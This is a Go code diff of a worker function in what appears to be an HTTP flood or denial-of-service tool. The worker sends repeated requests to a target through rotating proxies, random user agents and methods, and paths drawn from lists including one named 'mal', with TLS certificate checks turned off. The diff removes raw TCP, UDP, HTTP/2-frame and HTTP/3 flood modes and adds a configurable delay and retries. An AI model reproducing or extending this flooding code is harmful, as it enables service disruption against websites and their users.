@@ -626,24 +626,28 @@ func pickMode(mode string) string {
 func worker(jobs <-chan struct{}, config *Config, proxies, agents, methods, paths, mal []string, wg *sync.WaitGroup) {
     defer wg.Done()
     
-    tlsConf := &tlsutls.Config{
-        InsecureSkipVerify: true,
-        MinVersion:         tls.VersionTLS12,
-        MaxVersion:         tls.VersionTLS13,
-        ServerName:         strings.Split(config.BaseURL, "://")[1],  // Tambahkan ServerName
-        CurvePreferences:   []tlsutls.CurveID{tlsutls.X25519, tlsutls.CurveP256, tlsutls.CurveP384},
-    }
-
+    // Validate base URL
     baseURL := config.BaseURL
     if !strings.HasPrefix(baseURL, "http") {
         baseURL = "https://" + baseURL
     }
     
-    u, _ := url.Parse(baseURL)
-    host := u.Hostname()
-    target := host
-    if u.Port() != "" {
-        target += ":" + u.Port()
+    u, err := url.Parse(baseURL)
+    if err != nil {
+        return
+    }
+    
+    tlsConf := &tlsutls.Config{
+        InsecureSkipVerify: true,
+        MinVersion:         tls.VersionTLS12,
+        MaxVersion:         tls.VersionTLS13,
+        ServerName:         u.Hostname(),
+        CipherSuites: []uint16{
+            tlsutls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+            tlsutls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+            tlsutls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+            tlsutls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+        },
     }
 
     var client *http.Client
@@ -654,23 +658,15 @@ func worker(jobs <-chan struct{}, config *Config, proxies, agents, methods, path
     }
 
     for range jobs {
+        // Rate limiting
+        time.Sleep(config.RateLimit)
+        
         mode := pickMode(config.Mode)
         path := randomPath(paths, mal)
         
-        switch mode {
-        case "h2f":
-            customHTTP2Frame(target, host, path)
-            atomic.AddInt64(&total, 1)
-        case "h3":
-            customHTTP3(target, path)
-            atomic.AddInt64(&total, 1)
-        case "rawtcp":
-            rawTCP(target, host, path)
-            atomic.AddInt64(&total, 1)
-        case "rawudp":
-            rawUDP(target)
-            atomic.AddInt64(&total, 1)
-        default:
+        // Implement retry mechanism
+        maxRetries := 3
+        for retry := 0; retry < maxRetries; retry++ {
             method := methods[mrand.Intn(len(methods))]
             ua := agents[mrand.Intn(len(agents))]
             url := baseURL + path
@@ -692,12 +688,25 @@ func worker(jobs <-chan struct{}, config *Config, proxies, agents, methods, path
             resp, err := client.Do(req)
             atomic.AddInt64(&total, 1)
             
-            if err == nil && resp != nil {
-                io.Copy(io.Discard, resp.Body)
-                resp.Body.Close()
-                atomic.AddInt64(&success, 1)
-            } else {
+            if err != nil {
                 atomic.AddInt64(&fail, 1)
+                time.Sleep(time.Second * time.Duration(retry+1))
+                continue
+            }
+            
+            if resp == nil {
+                atomic.AddInt64(&fail, 1)
+                continue
+            }
+
+            _, err = io.Copy(io.Discard, resp.Body)
+            resp.Body.Close()
+            
+            if err != nil {
+                atomic.AddInt64(&fail, 1)
+            } else {
+                atomic.AddInt64(&success, 1)
+                break // Success, keluar dari retry loop
             }
         }
     }
